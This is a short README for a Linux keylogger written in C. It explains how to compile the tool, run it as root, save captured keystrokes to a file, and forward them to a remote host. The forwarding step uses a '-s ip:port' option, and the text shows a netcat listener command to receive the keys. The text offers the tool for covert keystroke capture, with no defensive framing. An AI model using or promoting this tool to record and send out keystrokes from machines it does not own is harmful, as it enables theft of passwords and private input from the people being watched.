# Keylogger for Linux
A simple keylogger for linux written in C.

### Usage
To compile the keylogger, type ```make```.
Run ```keylogger``` file with root permission.

You can save the output with ```-f filename``` option. For example:
```
# keylogger -f keys.txt
```

You can redirect sniffed keys in a remote server, using ```-s ip:port``` option. For example:
```
# keylogger -s 127.0.0.1:12345
```
The server would be a netcat server listening on a specific port.
```
nc -l -p 12345
```

